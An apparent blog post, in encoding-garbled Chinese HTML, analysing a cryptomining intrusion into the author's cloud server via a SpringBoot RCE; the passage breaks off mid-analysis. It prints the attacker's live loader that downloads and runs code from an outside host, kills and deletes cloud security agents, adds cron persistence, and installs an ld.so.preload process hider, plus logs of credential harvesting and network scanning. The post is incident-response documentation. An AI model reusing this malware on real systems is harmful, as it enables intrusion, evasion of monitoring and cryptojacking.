<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div itemprop=&quot;articleBody&quot; class=&quot;post-content&quot;&gt;&lt;p&gt;å¸¸åœ¨æ²³è¾¹èµ°ï¼Œå“ªèƒ½ä¸æ¹¿é‹ã€‚è‡ªè®¤ä¸ºå®‰å…¨é˜²èŒƒæ„è¯†ä¸é”™ï¼Œæ²¡æƒ³åˆ°æœåŠ¡å™¨è¢«å…¥ä¾µæŒ–çŸ¿çš„äº‹æƒ…ä¹Ÿèƒ½è½åˆ°è‡ªå·±å¤´ä¸Šã€‚&lt;/p&gt;&lt;p&gt;æœ¬æ–‡ç®€è¦è®°å½•å‘ç°æœåŠ¡å™¨è¢«å…¥ä¾µæŒ–çŸ¿çš„è¿‡ç¨‹ï¼ŒåŒæ—¶åˆ†ææœ¨é©¬çš„ç—•è¿¹å’Œä¿¡æ¯ï¼Œæœ€åç»™å‡ºè§£å†³æ–¹æ³•ã€‚&lt;br/&gt; &lt;span id=&quot;bnp_i_1&quot;/&gt;&lt;/p&gt;&lt;h2&gt;æœåŠ¡å™¨è¢«å…¥ä¾µæŒ–çŸ¿è¿‡ç¨‹&lt;/h2&gt;&lt;h3&gt;äº‹æƒ…ç»è¿‡&lt;/h3&gt;&lt;p&gt;æ˜¨å¤©æ˜¯å‘¨å…­ï¼Œç¡å¾—æ¯”è¾ƒæ™šã€‚èººåºŠä¸Šç©æ‰‹æœºæ—¶å¿½ç„¶æ”¶åˆ°&lt;a href=&quot;https://www.aliyun.com/minisite/goods?userCode=k4evdv8n&quot; target=&quot;_blank&quot; rel=&quot;noopener nofollow&quot;&gt;é˜¿é‡Œäº‘&lt;/a&gt;çŸ­ä¿¡å’Œé‚®ä»¶æé†’ï¼ŒæœåŠ¡å™¨æœ‰å¼‚å¸¸è¡Œä¸ºï¼š&lt;/p&gt;&lt;figure id=&quot;attachment_9812&quot; aria-describedby=&quot;caption-attachment-9812&quot; class=&quot;wp-caption aligncenter&quot;&gt;&lt;a href=&quot;https://tlanyan.pp.ua/server-being-hacked-log/%e9%98%bf%e9%87%8c%e4%ba%91%e9%82%ae%e4%bb%b6%e6%8a%a5%e8%ad%a6/&quot; rel=&quot;attachment wp-att-9812&quot;&gt;&lt;noscript&gt;&lt;img class=&quot;size-full wp-image-9812&quot; src=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/é˜¿é‡Œäº‘é‚®ä»¶æŠ¥è­¦.png&quot; alt=&quot;é˜¿é‡Œäº‘é‚®ä»¶æŠ¥è­¦&quot; srcset=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/é˜¿é‡Œäº‘é‚®ä»¶æŠ¥è­¦.png?v=1626610200 2216w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/é˜¿é‡Œäº‘é‚®ä»¶æŠ¥è­¦-300x221.png?v=1626610200 300w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/é˜¿é‡Œäº‘é‚®ä»¶æŠ¥è­¦-1024x755.png?v=1626610200 1024w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/é˜¿é‡Œäº‘é‚®ä»¶æŠ¥è­¦-768x566.png?v=1626610200 768w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/é˜¿é‡Œäº‘é‚®ä»¶æŠ¥è­¦-1536x1133.png?v=1626610200 1536w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/é˜¿é‡Œäº‘é‚®ä»¶æŠ¥è­¦-2048x1510.png?v=1626610200 2048w&quot; sizes=&quot;(max-width: 2216px) 100vw, 2216px&quot;/&gt;&lt;/noscript&gt;&lt;img class=&quot;lazyload size-full wp-image-9812&quot; src=&quot;&quot; data-src=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/é˜¿é‡Œäº‘é‚®ä»¶æŠ¥è­¦.png&quot; alt=&quot;é˜¿é‡Œäº‘é‚®ä»¶æŠ¥è­¦&quot; data-srcset=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/é˜¿é‡Œäº‘é‚®ä»¶æŠ¥è­¦.png?v=1626610200 2216w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/é˜¿é‡Œäº‘é‚®ä»¶æŠ¥è­¦-300x221.png?v=1626610200 300w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/é˜¿é‡Œäº‘é‚®ä»¶æŠ¥è­¦-1024x755.png?v=1626610200 1024w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/é˜¿é‡Œäº‘é‚®ä»¶æŠ¥è­¦-768x566.png?v=1626610200 768w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/é˜¿é‡Œäº‘é‚®ä»¶æŠ¥è­¦-1536x1133.png?v=1626610200 1536w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/é˜¿é‡Œäº‘é‚®ä»¶æŠ¥è­¦-2048x1510.png?v=1626610200 2048w&quot; data-sizes=&quot;(max-width: 2216px) 100vw, 2216px&quot;/&gt;&lt;/a&gt;&lt;figcaption id=&quot;caption-attachment-9812&quot; class=&quot;wp-caption-text&quot;&gt;é˜¿é‡Œäº‘é‚®ä»¶æŠ¥è­¦&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;ä¸€çœ‹é‚®ä»¶å†…å®¹å°±çŸ¥é“ä¸å¾—äº†ï¼Œèµ¶ç´§æ‰“å¼€ç”µè„‘å¤„ç†ã€‚&lt;/p&gt;&lt;p&gt;é¦–å…ˆç”¨ &lt;code&gt;netstat&lt;/code&gt; å‘½ä»¤æŸ¥çœ‹ç«¯å£ï¼Œå‘ç°ä¸€ä¸ªå¼‚å¸¸çš„ç«¯å£ï¼Œä½†ä¸æ˜¾ç¤ºç¨‹åºåã€‚è¿™æ—¶å¿ƒé‡Œå·²ç»å¾ˆæ¸…æ¥šï¼ŒæœåŠ¡å™¨ä¸Šçš„Javaç¨‹åºè¢«è¿œç¨‹æ‰§è¡Œä»£ç (RCE)ï¼Œä¹Ÿè®¸è¿˜è¢«æ¤å…¥äº†&lt;code&gt;rootkit&lt;/code&gt;ã€‚&lt;/p&gt;&lt;p&gt;é¦–è¦é—®é¢˜æ˜¯ä¿éšœä¸šåŠ¡æ­£å¸¸å¯ç”¨ï¼Œäºæ˜¯å¿«é€Ÿæ‹‰èµ·å¦å¤–ä¸€ä¸ªå®ä¾‹ï¼Œå°†ä¸šåŠ¡è¿ç§»è¿‡å»ã€‚æ¥ä¸‹æ¥ï¼Œ é¦–å…ˆå°†è¢«å…¥ä¾µæœåŠ¡å™¨å…³æœºï¼Œç„¶åä¸€æ­¥æ­¥ç ”ç©¶å…¥ä¾µè¿‡ç¨‹ï¼Œä»¥åŠå…¶åœ¨æœåŠ¡å™¨ä¸Šçš„è¡Œä¸ºã€‚&lt;/p&gt;&lt;h3&gt;å…¥ä¾µè¡Œä¸ºåˆ†æ&lt;/h3&gt;&lt;p&gt;æ ¹æ®é‚®ä»¶å†…å®¹ï¼Œä¸€ä¸ª&lt;a href=&quot;/tag/spring-boot/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;SpringBoot&lt;/a&gt;åº”ç”¨è¢«getshellå¹¶è¢«æ‰§è¡Œè¿œç¨‹ä»£ç ã€‚è¢«æ‰§è¡Œçš„ä»£ç è¯­å¥base64è§£ç åä¸ºï¼š&lt;/p&gt;&lt;pre&gt;python -c &#x27;import urllib;exec urllib.urlopen(&quot;http://m.windowsupdatesupport.org/d/loader.py&quot;).read()&lt;/pre&gt;&lt;p&gt;å°†å…¶ä¸‹è½½ï¼Œå†…å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;&lt;pre&gt;import sys
import os
from os.path import expanduser
ver=sys.version


shs=&#x27;&#x27;&#x27;ps aux | grep -v grep | grep &#x27;aegis&#x27; | awk &#x27;{print $11}&#x27; | xargs  dirname  | xargs  rm -rf
ps aux | grep -v grep | grep &#x27;hids&#x27; | awk &#x27;{print $11}&#x27; | xargs  dirname  | xargs  rm -rf
ps aux | grep -v grep | grep &#x27;cloudwalker&#x27; | awk &#x27;{print $11}&#x27; | xargs  dirname  | xargs  rm -rf
ps aux | grep -v grep | grep &#x27;titanagent&#x27; | awk &#x27;{print $11}&#x27; | xargs  dirname  | xargs  rm -rf
ps aux | grep -v grep | grep &#x27;edr&#x27; | awk &#x27;{print $2}&#x27; | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep &#x27;aegis&#x27; | awk &#x27;{print $2}&#x27; | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep &#x27;Yun&#x27; | awk &#x27;{print $2}&#x27; | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep &#x27;hids&#x27; | awk &#x27;{print $2}&#x27; | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep &#x27;edr&#x27; | awk &#x27;{print $2}&#x27; | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep &#x27;cloudwalker&#x27; | awk &#x27;{print $2}&#x27; | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep &#x27;titanagent&#x27; | awk &#x27;{print $2}&#x27; | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep &#x27;sgagent&#x27; | awk &#x27;{print $2}&#x27; | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep &#x27;barad_agent&#x27; | awk &#x27;{print $2}&#x27; | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep &#x27;hostguard&#x27; | awk &#x27;{print $2}&#x27; | xargs  -I {}  kill -9 {}

rm -rf /usr/local/aegis
rm -rf /usr/local/qcloud
rm -rf /usr/local/hostguard/bin


ps aux | grep -v grep | grep &#x27;kworkers&#x27; | awk &#x27;{print $2}&#x27; | xargs  -I {}  kill -9 {}

&#x27;&#x27;&#x27;
os.system(shs)
domainroota=&quot;m.windowsupdatesupport.org&quot;
#domainroota=&quot;192.168.67.131&quot;
#$domainroota
#curl  http://$domainroota/d/kworkers -o $gitdir/kworkers


homedir=expanduser(&quot;~&quot;)
gitdir=&quot;&quot;
try:
    os.mkdir(homedir+&quot;/.git&quot;)
except Exception as e:
    print(e)
if os.path.isdir(homedir+&quot;/.git&quot;):
    gitdir=homedir+&quot;/.git&quot;


try:
    os.mkdir(&quot;./.git&quot;)
except Exception as e:
    print(e)
if os.path.isdir(&quot;./.git&quot;):
    gitdir=&quot;./.git&quot;


downloadu=&quot;http://{}/d/kworkers&quot;.format(domainroota)
if ver.startswith(&quot;3&quot;):
    import urllib.request
    with urllib.request.urlopen(downloadu) as f:
        html = f.read()
        open(gitdir + &quot;/kworkers&quot;, &#x27;wb&#x27;).write(html)
else:
    import urllib2
    with open(gitdir + &quot;/kworkers&quot;, &#x27;wb&#x27;) as f:
        f.write(urllib2.urlopen(&quot;http://{}/d/kworkers&quot;.format(domainroota)).read())
        f.close()

print (&quot;Download Complete!&quot;)
os.system(&quot;chmod 777 &quot;+gitdir+&quot;/kworkers&quot;)
if os.path.isfile(&#x27;/.dockerenv&#x27;):
    os.system(gitdir+&quot;/kworkers&quot;)
else:
    os.system(&quot;nohup {}/kworkers &amp;gt;&amp;gt;{}/.log&amp;amp;&quot;.format(gitdir,gitdir))&lt;/pre&gt;&lt;p&gt;è¿œç¨‹ä»£ç ä¸»è¦åšäº†è¿™äº›äº‹æƒ…ï¼š&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;ol&gt;&lt;li&gt;å¸è½½æœåŠ¡å™¨ä¸Šçš„å®‰å…¨ç›‘æ§å·¥å…·ï¼›äº‹åå¼€æœºï¼Œå‘ç°é˜¿é‡Œäº‘ç›¾æœç„¶è¢«å¸è½½äº†ï¼›&lt;/li&gt;&lt;li&gt;å…³æ‰æ‰€æœ‰kworkersè¿›ç¨‹ï¼›&lt;/li&gt;&lt;li&gt;åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»º&lt;code&gt;.git&lt;/code&gt;ç›®å½•ï¼Œä¸‹è½½å¹¶æ‰§è¡Œkworkersç¨‹åºã€‚&lt;/li&gt;&lt;/ol&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;ä¸Šç½‘æœäº†ä¸€ä¸‹kworkersï¼Œå‘ç°æ˜¯æŒ–çŸ¿åº”ç”¨ï¼Œå¹¶éåŠ å¯†å‹’ç´¢ç­‰æœ¨é©¬ï¼Œå¿ƒé‡Œç¨å¾®å®‰å¿ƒä¸€ç‚¹ã€‚é€šè¿‡é˜¿é‡Œäº‘åå°ç›‘æ§ï¼Œå¯ä»¥çœ‹åˆ°æœ¨é©¬å…¥ä¾µåï¼ŒçŸ­æ—¶é—´å†…cpuå ç”¨ç‡é£™å‡ï¼ˆæœ¬äººå¤„ç†åŠæ—¶ï¼Œæœ¨é©¬æŒ–çŸ¿æ—¶é—´å¤§æ¦‚æŒç»­5åˆ†é’Ÿå·¦å³ï¼‰ï¼š&lt;/p&gt;&lt;figure id=&quot;attachment_9814&quot; aria-describedby=&quot;caption-attachment-9814&quot; class=&quot;wp-caption aligncenter&quot;&gt;&lt;a href=&quot;https://tlanyan.pp.ua/server-being-hacked-log/%e9%98%bf%e9%87%8c%e4%ba%91%e6%9c%8d%e5%8a%a1%e5%99%a8cpu%e4%bd%bf%e7%94%a8%e7%8e%87/&quot; rel=&quot;attachment wp-att-9814&quot;&gt;&lt;noscript&gt;&lt;img class=&quot;size-full wp-image-9814&quot; src=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/é˜¿é‡Œäº‘æœåŠ¡å™¨cpuä½¿ç”¨ç‡.png&quot; alt=&quot;é˜¿é‡Œäº‘æœåŠ¡å™¨cpuä½¿ç”¨ç‡&quot; srcset=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/é˜¿é‡Œäº‘æœåŠ¡å™¨cpuä½¿ç”¨ç‡.png?v=1626611298 1134w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/é˜¿é‡Œäº‘æœåŠ¡å™¨cpuä½¿ç”¨ç‡-300x155.png?v=1626611298 300w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/é˜¿é‡Œäº‘æœåŠ¡å™¨cpuä½¿ç”¨ç‡-1024x529.png?v=1626611298 1024w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/é˜¿é‡Œäº‘æœåŠ¡å™¨cpuä½¿ç”¨ç‡-768x397.png?v=1626611298 768w&quot; sizes=&quot;(max-width: 1134px) 100vw, 1134px&quot;/&gt;&lt;/noscript&gt;&lt;img class=&quot;lazyload size-full wp-image-9814&quot; src=&quot;&quot; data-src=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/é˜¿é‡Œäº‘æœåŠ¡å™¨cpuä½¿ç”¨ç‡.png&quot; alt=&quot;é˜¿é‡Œäº‘æœåŠ¡å™¨cpuä½¿ç”¨ç‡&quot; data-srcset=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/é˜¿é‡Œäº‘æœåŠ¡å™¨cpuä½¿ç”¨ç‡.png?v=1626611298 1134w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/é˜¿é‡Œäº‘æœåŠ¡å™¨cpuä½¿ç”¨ç‡-300x155.png?v=1626611298 300w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/é˜¿é‡Œäº‘æœåŠ¡å™¨cpuä½¿ç”¨ç‡-1024x529.png?v=1626611298 1024w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/é˜¿é‡Œäº‘æœåŠ¡å™¨cpuä½¿ç”¨ç‡-768x397.png?v=1626611298 768w&quot; data-sizes=&quot;(max-width: 1134px) 100vw, 1134px&quot;/&gt;&lt;/a&gt;&lt;figcaption id=&quot;caption-attachment-9814&quot; class=&quot;wp-caption-text&quot;&gt;é˜¿é‡Œäº‘æœåŠ¡å™¨cpuä½¿ç”¨ç‡&lt;/figcaption&gt;&lt;/figure&gt;&lt;h3&gt;æœåŠ¡å™¨æ®‹ç•™ç—•è¿¹&lt;/h3&gt;&lt;p&gt;å¤§æ¦‚çŸ¥é“äº†æœ¨é©¬çš„è¡Œä¸ºï¼Œæ¥ç€é‡å¯æœåŠ¡å™¨ï¼ŒæŸ¥çœ‹æœåŠ¡å™¨ä¸Šçš„ç—•è¿¹ã€‚&lt;/p&gt;&lt;p&gt;1. æŸ¥çœ‹æœ‰æ— æ·»åŠ å®šæ—¶ä»»åŠ¡ï¼š&lt;/p&gt;&lt;pre&gt;# crontab -l

0 2 * * * /xxx/.git/kworkers&lt;/pre&gt;&lt;p&gt;æœ¨é©¬æ·»åŠ äº†å®šæ—¶å¯åŠ¨ä»»åŠ¡ã€‚&lt;/p&gt;&lt;p&gt;2. è¿›å…¥æœ¨é©¬ä¸»ç›®å½•ï¼Œå‘ç°ä¸‹è½½äº†å¦‚ä¸‹æ–‡ä»¶ï¼š&lt;/p&gt;&lt;figure id=&quot;attachment_9816&quot; aria-describedby=&quot;caption-attachment-9816&quot; class=&quot;wp-caption aligncenter&quot;&gt;&lt;a href=&quot;https://tlanyan.pp.ua/server-being-hacked-log/%e6%8c%96%e7%9f%bf%e6%9c%a8%e9%a9%ac%e4%b8%8b%e8%bd%bd%e7%9a%84%e7%a8%8b%e5%ba%8f%e6%96%87%e4%bb%b6/&quot; rel=&quot;attachment wp-att-9816&quot;&gt;&lt;noscript&gt;&lt;img class=&quot;size-full wp-image-9816&quot; src=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/æŒ–çŸ¿æœ¨é©¬ä¸‹è½½çš„ç¨‹åºæ–‡ä»¶.png&quot; alt=&quot;æŒ–çŸ¿æœ¨é©¬ä¸‹è½½çš„ç¨‹åºæ–‡ä»¶&quot; srcset=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/æŒ–çŸ¿æœ¨é©¬ä¸‹è½½çš„ç¨‹åºæ–‡ä»¶.png?v=1626611647 1170w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/æŒ–çŸ¿æœ¨é©¬ä¸‹è½½çš„ç¨‹åºæ–‡ä»¶-300x186.png?v=1626611647 300w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/æŒ–çŸ¿æœ¨é©¬ä¸‹è½½çš„ç¨‹åºæ–‡ä»¶-1024x635.png?v=1626611647 1024w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/æŒ–çŸ¿æœ¨é©¬ä¸‹è½½çš„ç¨‹åºæ–‡ä»¶-768x477.png?v=1626611647 768w&quot; sizes=&quot;(max-width: 1170px) 100vw, 1170px&quot;/&gt;&lt;/noscript&gt;&lt;img class=&quot;lazyload size-full wp-image-9816&quot; src=&quot;&quot; data-src=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/æŒ–çŸ¿æœ¨é©¬ä¸‹è½½çš„ç¨‹åºæ–‡ä»¶.png&quot; alt=&quot;æŒ–çŸ¿æœ¨é©¬ä¸‹è½½çš„ç¨‹åºæ–‡ä»¶&quot; data-srcset=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/æŒ–çŸ¿æœ¨é©¬ä¸‹è½½çš„ç¨‹åºæ–‡ä»¶.png?v=1626611647 1170w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/æŒ–çŸ¿æœ¨é©¬ä¸‹è½½çš„ç¨‹åºæ–‡ä»¶-300x186.png?v=1626611647 300w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/æŒ–çŸ¿æœ¨é©¬ä¸‹è½½çš„ç¨‹åºæ–‡ä»¶-1024x635.png?v=1626611647 1024w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/æŒ–çŸ¿æœ¨é©¬ä¸‹è½½çš„ç¨‹åºæ–‡ä»¶-768x477.png?v=1626611647 768w&quot; data-sizes=&quot;(max-width: 1170px) 100vw, 1170px&quot;/&gt;&lt;/a&gt;&lt;figcaption id=&quot;caption-attachment-9816&quot; class=&quot;wp-caption-text&quot;&gt;æŒ–çŸ¿æœ¨é©¬ä¸‹è½½çš„ç¨‹åºæ–‡ä»¶&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;æ­¤å¤–ï¼Œä¸Šå±‚ç›®å½•å’Œå®¶ç›®å½•è¿˜å¤šäº† &lt;code&gt;cert_key.pem&lt;/code&gt; å’Œ &lt;code&gt;cert.pem&lt;/code&gt; ä¸¤ä¸ªæ–‡ä»¶ï¼Œåˆ†åˆ«å­˜æ”¾å…¬é’¥å’Œå¯†é’¥ã€‚&lt;/p&gt;&lt;p&gt;3. æŸ¥çœ‹æœ¨é©¬ç•™ä¸‹çš„æ—¥å¿—ï¼Œæœ‰å¦‚ä¸‹å†…å®¹ï¼š&lt;/p&gt;&lt;pre&gt;/xxx/.git
/xxx/.git
working dir /xxx from pid 23684
version not exist download
Downloaded: http://m.windowsupdatesupport.org/d/download
version not exist dbus
Downloaded: http://m.windowsupdatesupport.org/d/dbus
version not exist hideproc.sh
Downloaded: http://m.windowsupdatesupport.org/d/hideproc.sh
error exit status 1version not exist sshkey.sh
Downloaded: http://m.windowsupdatesupport.org/d/sshkey.sh
version not exist autoupdate
Downloaded: http://m.windowsupdatesupport.org/d/autoupdate
version not exist kworkers
Key path not found
/xxx/.git
passfound  protected
passfound  provided
passfound  +client
passfound  +client
passfound  protected
passfound  provided
passfound  quality
passfound  (plus
passfound  (digits,
passfound  prompt
found aksk xxxx xxxx
found aksk xxxx xxxx
passfound  xxx
passfound  xxx
passfound  xxx
passfound  xxx
passfound  xxx
passfound  xxx
lstat /proc/7776/fd/3: no such file or directory
lstat /proc/7776/fdinfo/3: no such file or directory
lstat /proc/7776/task/7776/fd/3: no such file or directory
lstat /proc/7776/task/7776/fdinfo/3: no such file or directory
lstat /proc/7776/task/7777/fd/3: no such file or directory
lstat /proc/7776/task/7777/fdinfo/3: no such file or directory
lstat /proc/7776/task/7778/fd/3: no such file or directory
lstat /proc/7776/task/7778/fdinfo/3: no such file or directory
lstat /proc/7776/task/7779/fd/3: no such file or directory
lstat /proc/7776/task/7779/fdinfo/3: no such file or directory
lstat /proc/7776/task/7780/fd/3: no such file or directory
lstat /proc/7776/task/7780/fdinfo/3: no such file or directory
lstat /proc/7776/task/7781/fd/3: no such file or directory
lstat /proc/7776/task/7781/fdinfo/3: no such file or directory
lstat /proc/7776/task/7782/fd/3: no such file or directory
lstat /proc/7776/task/7782/fdinfo/3: no such file or directory
lstat /proc/7776/task/7783/fd/3: no such file or directory
lstat /proc/7776/task/7783/fdinfo/3: no such file or directory
restart cmd  /xxx/.git/kworkers
/xxx/.git
passfound  file,
passfound  settings
passfound  file.
passfound  callbacks
passfound  Callback
passfound  example
passfound  prompt
passfound  password
passfound  information
passfound  token
passfound  token
passfound  token
passfound  Password
passfound  password
passfound  password
passfound  -based
passfound  Password
passfound  (using
passfound  field&amp;gt;
passfound  retry
passfound  foobar
passfound  foobar
passfound  foobar
passfound  foobar
passfound  foobar
passfound  password
passfound  password
passfound  foobar
passfound  foobar
passfound  secretr
total passwords 25
xxx.xxx.xxx.xxx
lan ip
doscan range  xxx.xxx.0.0/16
ping...
Receive 24 bytes from xxx.xxx.xxx.xxx: icmp_seq=0 time=496.309Âµs
working dir /xxx from pid 7792
Receive 24 bytes from xxx.xxx.xxx: icmp_seq=0 time=257.973Âµs
xxx.xxx.xxx is alive
xxx.xxx.xxx is alive
xxx.xxx.xxx:80  open
xxx.xxx0xxx:443  open
version  same download
version  same dbus
restart dbus
exec again dbus downrun
kill process pid 23709

process completed
version  same hideproc.sh
skip restart hideproc.sh
version  same sshkey.sh
skip restart sshkey.sh
version  same autoupdate
skip restart autoupdate
version  same kworkers
Key path not found&lt;/pre&gt;&lt;p&gt;æ ¹æ®æ—¥å¿—ï¼Œä¸»è¦æ˜¯ä¸‹è½½ç¨‹åºï¼Œæ£€æµ‹ç”¨æˆ·åå’Œå¯†ç ï¼Œæ¢æµ‹å†…ç½‘ï¼Œç„¶åå¯åŠ¨è‡ªåŠ¨æ›´æ–°ã€éšè—è¿›ç¨‹ç­‰ç¨‹åºã€‚&lt;/p&gt;&lt;p&gt;4. å¯¹&lt;code&gt;hideproc.sh&lt;/code&gt;æ„Ÿå…´è¶£ï¼Œå…¶å†…å®¹ä¸ºï¼š&lt;/p&gt;&lt;pre&gt;if [ &quot;$EUID&quot; -ne 0 ]
  then echo &quot;Please run as root&quot;
else
  if [ `grep libc2.28 /etc/ld.so.preload`  ]
  then echo &quot;hideproc already done!!&quot;
  else
    apt-get update -y
    apt-get install build-essential -y
    yum check-update
    yum install build-essential -y
    dnf groupinstall &quot;Development Tools&quot; -y
    yum group install &quot;Development Tools&quot;  -y
    curl http://m.windowsupdatesupport.org/d/processhider.c -o  processhider.c

    gcc -Wall -fPIC -shared -o libc2.28.so processhider.c -ldl
    mv libc2.28.so /usr/local/lib/ -f
    grep libc2.28 /etc/ld.so.preload  || echo /usr/local/lib/libc2.28.so &amp;gt;&amp;gt; /etc/ld.so.preload
    rm -f processhider.c
    ls &amp;gt;/tmp/.1  2&amp;gt;&amp;amp;1
    grep libc2.28.so /tmp/.1 &amp;amp;&amp;amp; echo &amp;gt;/etc/ld.so.preload
  fi
fi&lt;/pre&gt;&lt;p&gt;å…¶é¦–å…ˆæ£€æµ‹æ˜¯å¦rootç”¨æˆ·ï¼Œç„¶åç¼–è¯‘libc2å…±äº«åº“ï¼Œæ³¨å…¥éšè—è¿›ç¨‹çš„ä»£ç ã€‚è¿™åº”è¯¥æ˜¯ç”¨&lt;code&gt;netstat&lt;/code&gt;æ— æ³•æŸ¥çœ‹åˆ°è¿›ç¨‹åçš„åŸå› ã€‚&lt;/p&gt;&lt;p&gt;5. æŸ¥çœ‹è®¿é—®æ—¥å¿—ï¼Œå‘ç°æœŸé—´æœ‰ä¸ªIPå¯¹æœåŠ¡å™¨è¿›è¡Œçˆ†ç ´ï¼š&lt;/p&gt;&lt;figure id=&quot;attachment_9818&quot; aria-describedby=&quot;caption-attachment-9818&quot; class=&quot;wp-caption aligncenter&quot;&gt;&lt;a href=&quot;https://tlanyan.pp.ua/server-being-hacked-log/nginx%e7%88%86%e7%a0%b4%e6%97%a5%e5%bf%97/&quot; rel=&quot;attachment wp-att-9818&quot;&gt;&lt;noscript&gt;&lt;img class=&quot;size-full wp-image-9818&quot; src=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginxçˆ†ç ´æ—¥å¿—.png&quot; alt=&quot;Nginxçˆ†ç ´æ—¥å¿—&quot; srcset=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginxçˆ†ç ´æ—¥å¿—.png?v=1626613017 3782w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginxçˆ†ç ´æ—¥å¿—-300x151.png?v=1626613017 300w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginxçˆ†ç ´æ—¥å¿—-1024x517.png?v=1626613017 1024w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginxçˆ†ç ´æ—¥å¿—-768x387.png?v=1626613017 768w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginxçˆ†ç ´æ—¥å¿—-1536x775.png?v=1626613017 1536w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginxçˆ†ç ´æ—¥å¿—-2048x1033.png?v=1626613017 2048w&quot; sizes=&quot;(max-width: 3782px) 100vw, 3782px&quot;/&gt;&lt;/noscript&gt;&lt;img class=&quot;lazyload size-full wp-image-9818&quot; src=&quot;&quot; data-src=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginxçˆ†ç ´æ—¥å¿—.png&quot; alt=&quot;Nginxçˆ†ç ´æ—¥å¿—&quot; data-srcset=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginxçˆ†ç ´æ—¥å¿—.png?v=1626613017 3782w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginxçˆ†ç ´æ—¥å¿—-300x151.png?v=1626613017 300w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginxçˆ†ç ´æ—¥å¿—-1024x517.png?v=1626613017 1024w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginxçˆ†ç ´æ—¥å¿—-768x387.png?v=1626613017 768w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginxçˆ†ç ´æ—¥å¿—-1536x775.png?v=1626613017 1536w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginxçˆ†ç ´æ—¥å¿—-2048x1033.png?v=1626613017 2048w&quot; data-sizes=&quot;(max-width: 3782px) 100vw, 3782px&quot;/&gt;&lt;/a&gt;&lt;figcaption id=&quot;caption-attachment-9818&quot; class=&quot;wp-caption-text&quot;&gt;Nginxçˆ†ç 